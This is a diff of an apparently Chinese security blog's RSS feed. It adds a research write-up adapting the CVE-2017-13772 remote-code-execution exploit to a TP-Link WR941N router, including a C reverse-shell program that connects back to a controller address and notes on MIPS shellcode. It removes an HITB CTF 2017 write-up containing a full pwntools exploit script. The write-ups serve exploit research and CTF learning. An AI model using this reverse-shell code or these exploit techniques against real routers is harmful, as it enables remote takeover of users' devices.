@@ -99,6 +99,90 @@
     </item>
     
     <item>
+      <title>TP-Link WR941N路由器研究</title>
+      <link>http://0x48.pw/2017/10/30/0x3B/</link>
+      <guid>http://0x48.pw/2017/10/30/0x3B/</guid>
+      <pubDate>Mon, 30 Oct 2017 03:07:10 GMT</pubDate>
+      <description>
+      
+        &lt;p&gt;之前看到了一个CVE, &lt;a href=&quot;https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CVE-2017-13772&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是&lt;code&gt;CVE-2017-13772&lt;/code&gt;文章中给的EXP并不通用&lt;/p&gt;
+&lt;p&gt;所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑&lt;/p&gt;
+      
+      </description>
+      
+      <content:encoded><![CDATA[<p>之前看到了一个CVE, <a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
+<p>是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是<code>CVE-2017-13772</code>文章中给的EXP并不通用</p>
+<p>所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑</p>
+<a id="more"></a>
+<p>第一次研究mips指令的RCE，之前只学了intel指令集的pwn，所以进度挺慢的</p>
+<h1 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h1><p>第一天当然是配环境了，该路由器本身在默认情况下是不提供shell的，在@fenix帮助下获取到了路由器的shell，该款路由器上的busybox的命令比较少，curl, nc, wget这些命令都没有，只能用tftp进行数据传输，而且只有<code>/tmp</code>目录可写，路由器重启后，传上去的文件就没了，这些问题都可以通过刷固件解决，不过太麻烦了，只需要传上去一个<code>gdbserver</code>就好了，能根据固件中的bin得知这是一个大端mips指令集的设备，<code>gdbserver</code>也不用自己编译，直接下编译好的: <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="external">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
+<p>把<code>gdbserver.mipsbe</code>通过tftp上传到路由器的<code>/tmp</code>目录下</p>
+<p>然后根据<code>cve-2017-13772</code>分析文章说的那样使用gdbserver attach httpd最新的一个进程，然后就可以进行远程gdb调试了</p>
+<h1 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h1><p>第二天准备开始调试，但是发现gdb的两个编译选项, 一个<code>--host</code>，表示gdb运行的环境，一般默认就是本机环境，还有一个<code>--target</code>表示调试的目标环境，默认也是本机环境，所以一个64位ubuntu上默认的gdb只能调试64 elf程序。所以需要设置<code>--target=mipsbel-linux</code>参数进行编译gdb，才能调试大端的mips程序。</p>
+<p>编译差不多编译了半天，准备改天搞一个8核的机器专门来编译程序….</p>
+<p>编译成功后，就可以进行远程调试了，在路由器上执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; /tmp/gdbserver.mipsbe attach 0.0.0.0:12345 pid</div></pre></td></tr></table></figure>
+<p>然后使用编译好gdb进行调试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gdb</div><div class="line">(gdb) target remote 192.168.1.1:12345</div></pre></td></tr></table></figure>
+<p>但是失败了，又折腾了半天</p>
+<h1 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h1><p>第三天才真正的开始调试程序，首先说说我第二天遇到的问题，问题是下了断点没用，原因比较傻逼，我下断点的地址是wr940n的地址，我把两个bin搞混了</p>
+<p>然后根据<code>cve-2017-13772</code>分析文章中说的栈溢出的指令，在wr941n中也找到了该指令，而溢出情况也是一样，所以拿了wr940n的exp来打了一遍，结果当然是失败了。</p>
+<p>在wr940n的exp中，ROP是在<code>libuClibc-0.9.30.so</code>中找的，根据<code>$ cat /proc/pid/maps</code>命令，发现wr941n路由器的基地址和文章中显示的wr940n路由器的是一样的，然后再比较<code>libuClibc-0.9.30.so</code>文件的hash值，发现不同，所以要修改ROP地址。</p>
+<p>由于libc文件太大，用手找太累了，所以使用了那篇文章中的ida的mipsrop插件，这里又踩了一个坑，因为我用的是ida7.0，而这个插件只能在ida6.8(更低的没试过)版本使用。</p>
+<p>修改了ROP后，再进行尝试exp，发现仍然失败，然后进行调试查看原因，跟踪ROP执行流，发现能成功跳转到栈上执行shellcode，但是shellcode和文章中的，文章中的shellcode开头有一个使用xor进行解密的过程，执行完之后的指令和文章中的不一样。所以准备自己写一个shellcode</p>
+<h1 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h1><p>第四天就是开始写shellcod，首先给个mips指令和bin互转的网站：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="external">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></p>
+<p>然后说说写的过程中遇到的问题，该路由器输入是不接受<code>\x00</code>和<code>\x20</code>，所以ROP不是在ELF中寻找而是去libc中寻找：<code>libuClibc</code>基地址：<code>0x2aae000</code>， <code>httpd</code>基地址：<code>0x00400000</code></p>
+<p>如果在ELF中寻找ROP，则地址中总会有个<code>\x00</code>，所以ROP是在libc中寻找不存在<code>\x00</code>和<code>\x20</code>的地址。但是在shellcode中，这两个字符却很难避免，所以那篇文章中对shellcode进行了xor加密</p>
+<p>wr940n的exp使用的是一个bind shell的shellcode，而我改成了一个反弹shell的shellcode</p>
+<p>然后就是最后遇到的一个大坑，使用gdb调试成功的一个反弹shell的shellcode，在实际测试中却失败了，使用gdb成功，直接打失败，因为这个问题折腾了挺长的时间</p>
+<p>然后查阅资料，在看雪的一篇文章中找到了原因：<https: www.kanxue.com="" article-read-218.htm=""></https:></p>
+<blockquote>
+<p>mips 的 exp 编写中还有一个问题就是 cache incoherency。MIPS CPUs 有两个独立的 cache：指令 cache 和数据 cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发 flush，将数据写回到主内存。攻击者的攻击 payload 通常会被应用当做数据来处理，存储在数据缓存中。当 payload 触发漏洞，劫持程序执行流程的时候，会去执行内存中的 shellcode。<br>如果数据缓存没有触发 flush 的话，shellcode 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 shellcode 的地址处随机的代码，导致不可预知的后果。<br>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如 sleep(1) 或者其他类似的函数。sleep 的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行 flush。</p>
+</blockquote>
+<p>这个坑点在那篇文章中也提及了，但是没具体说明，如果没实际踩一踩，不一定能理解。但是讲道理，如果直接用wr940n的exp，修改下ROP地址和shellcode，应该是不会遇到这个坑的，但是我仍然遇到了，经过研究发现，是usleep的问题，猜测是由于堵塞的时间过短所以未执行flush？然后进行实际测试了一番，把usleep的时间修改为<code>18217</code>，同样没用，然后简单看了下两者的汇编，发现usleep只是简单的调用nanosleep，而sleep除了调用nanosleep还进行其他相关的操作，网上没搜到相关文章，因为精力有限，作为遗留问题，以后有时间的时候再继续研究。</p>
+<p>不过有几个猜测，</p>
+<p>1.时间问题，usleep的单位是微秒，18217也只有10ms，是不是要睡到1s？因为找不到合适的ROP，所以暂时没法证明<br>2.flush内存是靠sleep中的几个信号相关的函数？</p>
+<p>所以最终我的做法是在wr940n的exp的ROP链中，调用的是usleep(0xc*2+1)，但是我将usleep改成sleep =&gt; sleep(0xc*2+1)，数据缓存被成功flush到主内存中，就能成功执行shellcode了</p>
+<h1 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h1><p>在本次研究中，最后时间的除了一开始的调试环境搭建外，就是shellcode的编写了，因为在那篇cve分析的文章中已经给出了wr940n的exp，ROP只需要修改修改地址就好了，所以工作量最大的还是在Shellcode的编写这一部分</p>
+<p>首先是syscall部分，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">li $v0, 4183</div><div class="line">syscall 0x40404</div><div class="line"># sys_socket</div></pre></td></tr></table></figure>
+<ul>
+<li>mips采用的是RISC，32位系统下，指令固定采用4byte，syscall的字节码是<code>\x0c</code>，剩余的三字节默认用<code>\x00</code>补全，但是因为路由器不接受<code>\x00</code>的输入，所以在大端的情况下改成<code>\x01\x01\x01\x0c</code>，进行反汇编，就是<code>syscall 0x40404</code></li>
+</ul>
+<p>系统调用的相关函数除了几个mips特有的，其他的都是跟linux下的syscall一样，可参考: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></p>
+<p>比如<code>sys_socket</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define __NR_Linux			4000</div><div class="line">#define __NR_socket			(__NR_Linux + 183)</div></pre></td></tr></table></figure>
+<p>所以<code>$v0=4183</code>表示的就是socket函数，具体参数信息可以去参考linux的系统调用: <a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int sys_socket(int family, int type, int protocol)</div></pre></td></tr></table></figure>
+<p>现在，先用c来实现一遍反连shell的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ cat test.c</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;netinet/in.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">	int sockfd;</div><div class="line">	sockfd = socket(2,2,0);</div><div class="line">	struct sockaddr_in addr;</div><div class="line">	addr.sin_family = 2;</div><div class="line">	addr.sin_port = 0x3039;</div><div class="line">	addr.sin_addr = 0xc0a80164;</div><div class="line">	connect(sockfd, &amp;addr, sizeof(addr))</div><div class="line">	dup2(sockfd, 0);</div><div class="line">	dup2(sockfd, 1);</div><div class="line">	dup2(sockfd, 2);</div><div class="line">	execve(&quot;//bin/sh&quot;, 0, 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里有个关键点，<a href="https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h" target="_blank" rel="external">https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h</a></p>
+<p>和其他架构不一样，mips架构中，tcp是2，udp是1</p>
+<p>所以上面的代码比如在ubuntu中，是一个udp反连的代码，但是在mips中就是tcp反连</p>
+<p>还有一点就是wr941n是大端，所以12345端口是0x3039而不是0x3930，ip地址同理</p>
+<p>然后把上面代码转换成mips指令的汇编</p>
+<p>但是有个问题，之前说了该路由器不接收<code>\x00</code>和<code>\x20</code>两个字符，而上面的汇编转换成字节码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nor     $a0,$t7,$zero   =&gt;   &quot;\x01\xe0\x20\x27&quot;</div></pre></td></tr></table></figure>
+<p>所以要把这句指令进行修改, 因为<code>$a0</code>和<code>$a1</code>的值都为2，所以可以这样修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sw      $a1,-1($sp)  =&gt;  &quot;\xaf\xa5\xff\xff&quot;</div><div class="line">lw      $a0,-1($sp)  =&gt;  &quot;\x8f\xa4\xff\xff&quot;</div></pre></td></tr></table></figure>
+<p>把上面的汇编转成shellcode替换exp中的shellcode，实际测试，又发现一个问题，设备成功反连了控制端，但是却不能执行命令，到路由器上用ps查看，发现<code>sh</code>已经变为僵尸进程</p>
+<p>经研究，问题出在<code>execve(&quot;/bin/sh&quot;,0,0)</code>，如果我修改成<code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, 0], 0)</code>则成功反弹shell，可以任意命令执行</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/</a></li>
+<li><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="external">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></li>
+<li><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="external">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></li>
+<li><a href="https://www.kanxue.com/article-read-218.htm" target="_blank" rel="external">https://www.kanxue.com/article-read-218.htm</a></li>
+<li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></li>
+<li><a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html</a></li>
+<li><a href="https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h" target="_blank" rel="external">https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h</a></li>
+</ol>
+]]></content:encoded>
+      
+      <comments>http://0x48.pw/2017/10/30/0x3B/#disqus_thread</comments>
+    </item>
+    
+    <item>
       <title>Pwnhub 2013的国庆 writeup</title>
       <link>http://0x48.pw/2017/10/04/0x3A/</link>
       <guid>http://0x48.pw/2017/10/04/0x3A/</guid>
@@ -172,77 +256,6 @@
 ]]></content:encoded>
       
       <comments>http://0x48.pw/2017/10/04/0x3A/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>HITB CTF 2017 Pwn题研究🙉</title>
-      <link>http://0x48.pw/2017/08/29/0x39/</link>
-      <guid>http://0x48.pw/2017/08/29/0x39/</guid>
-      <pubDate>Tue, 29 Aug 2017 11:11:04 GMT</pubDate>
-      <description>
-      
-        &lt;p&gt;上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..&lt;/p&gt;
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p>上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..</p>
-<a id="more"></a>
-<p>题目在我GitHub上有：🔞<a href="https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)</a></p>
-<h1 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h1><p>这题是一道栈溢出的题目，溢出点也很容易找到，但问题是开了EIP，当时的思路是想可能有啥骚操作可以让hint函数泄露出system地址……可惜一直想错了，最主要有一个知识点我不知道</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /proc/self/maps</span></div><div class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</div></pre></td></tr></table></figure>
-<p>以前从来没注意到过，linux下的每个程序都有一个这样的虚拟地址，而且不管开没开EIP，这段地址都是不变的。</p>
-<p>再开看看这段地址是啥指令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/5i 0xffffffffff600000</div><div class="line">   0xffffffffff600000:	mov    rax,0x60</div><div class="line">   0xffffffffff600007:	syscall </div><div class="line">   0xffffffffff600009:	ret</div></pre></td></tr></table></figure>
-<p>就是一个不知道啥的系统调用然后ret，然后查了一些资料，这段地址是内核映射出来让程序调用内核一些功能的。而这段有用的指令就是一个ret，那么通过这个ret我们能进行怎样的骚操作？</p>
-<p>首先要先能理清楚栈结构，当我们的的流程是这样的时候：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main -&gt; hint -&gt; main -&gt; go -&gt; level</div></pre></td></tr></table></figure>
-<p>首先我们调用hint函数时，栈是这样的：</p>
-<p><img src="http://qn.lazysheep.cc/img/hitb1.png" alt="hitb1"></p>
-<p>然后在hint函数中并没有输出system的地址，但是却把system的地址放入了栈中</p>
-<p>执行完hint函数后，返回main函数，然后再调用go函数，这个时候栈是这样的：</p>
-<p><img src="http://qn.lazysheep.cc/img/hitb2.png" alt="hitb2"></p>
-<p>在hint函数中存放system地址的栈是在上图中变量v6的位置，在go函数中还调用了level函数，而溢出正好就是在level函数中，所以如果我们溢出构造一个栈地址如下所示</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">0xffffffffff600000</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0xffffffffff600000</td>
-</tr>
-<tr>
-<td style="text-align:center">0xffffffffff600000</td>
-</tr>
-<tr>
-<td style="text-align:center">v6(&amp;system)</td>
-</tr>
-</tbody>
-</table>
-<p>这样就能执行system函数了</p>
-<p>然后我们再来解决其他问题，v6是啥？会不会覆盖system，能执行system但是不能控制参数等问题。</p>
-<p>见如下代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">v2 = read_num();</div><div class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</div><div class="line">	v5 = v2;</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</div><div class="line">v3 = read_num();</div><div class="line">v6 = v5 + v3;</div></pre></td></tr></table></figure>
-<p>上面的代码是ida反编译go函数的代码，这部分要结合汇编看</p>
-<p>v5和v6的地址是一样的，所以如果输入的v2值大于0，则会把system的地址覆盖掉，这很好解决，输入负数和0都行，然后通过v3的输入，我们能在system地址的基础上进行加减。</p>
-<p>因为有libc，所以我们可以先获取system的符号地址为<code>0x45390</code></p>
-<p>然后使用<code>one_gadget</code>工具：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x4526a	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xcd0f3	execve("/bin/sh", rcx, r12)</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xcd1c8	execve("/bin/sh", rax, r12)</div><div class="line">constraints:</div><div class="line">  [rax] == NULL || rax == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xf0274	execve("/bin/sh", rsp+0x50, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x50] == NULL</div><div class="line"></div><div class="line">0xf1117	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xf66c0	execve("/bin/sh", rcx, [rbp-0xf8])</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</div></pre></td></tr></table></figure>
-<p>能获取到执行<code>execve(&#39;/bin/sh&#39;)</code>指令的地址，随便选一个和system地址相减得到差值，这个值就是v3，这样就把system的地址设置成执行<code>execve</code>的地址了，这样当rip跳到这里时就能直接执行系统命令了。</p>
-<p>但是还有一个小细节：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">999</span> )</div><div class="line">    &#123;</div><div class="line">      v7 = v6;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"More levels than before!"</span>);</div><div class="line">      v7 = <span class="number">1000L</span>L;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</div><div class="line">    v4 = time(<span class="number">0L</span>L);</div><div class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v7) != <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      v1 = time(<span class="number">0L</span>L);</div><div class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v8, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v7, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - v4), v3);</div><div class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
-<p>因为<code>execve</code>的地址大于999，所以v7被设置为1000，所以level需要进行1000次递归</p>
-<p>第一种思路是写代码，自动答对所有题目，然后在最后一次递归的时候溢出</p>
-<p>还有因为溢出的长度有0x200，所以其实不必跑1000次</p>
-<p>如果没有答对题目，递归则会退出，就没法进行溢出了</p>
-<p>最后得到payload：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./1000levels'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">	context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</div><div class="line">	context.log_level = <span class="string">"debug"</span></div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">'47.74.147.103'</span>, <span class="number">20001</span>)</div><div class="line"></div><div class="line">libc_base = <span class="number">-0x45390</span></div><div class="line">one_gadget_base = <span class="number">0x4526a</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Question: '</span>) </div><div class="line">	tmp1 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.recvuntil(<span class="string">'* '</span>)</div><div class="line">	tmp2 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.sendline(str(tmp1 * tmp2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer2</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"Answer:"</span>)</div><div class="line">	p.sendline(<span class="string">"233"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">'How many levels?'</span>)</div><div class="line">p.sendline(<span class="string">'-1'</span>)</div><div class="line">p.recvuntil(<span class="string">'Any more?'</span>)</div><div class="line"></div><div class="line"><span class="comment"># p.sendline("2")</span></div><div class="line">p.sendline(str(libc_base+one_gadget_base))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>): </div><div class="line">	log.info(i)</div><div class="line">	ansewer()</div><div class="line">p.recvuntil(<span class="string">'Question: '</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line"></div><div class="line">p.send(<span class="string">'a'</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffff600000</span>) * <span class="number">3</span>) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>PS: 这题我没做出来，是看别人的Payload学习的，所以上面的Payload不是我自己写的.</p>
-<p>PSS: 因为有别的重要的事，所以另外一题堆的题目暂时没空更新，等有空了会更新上来的</p>
-]]></content:encoded>
-      
-      <comments>http://0x48.pw/2017/08/29/0x39/#disqus_thread</comments>
     </item>
     
   </channel>
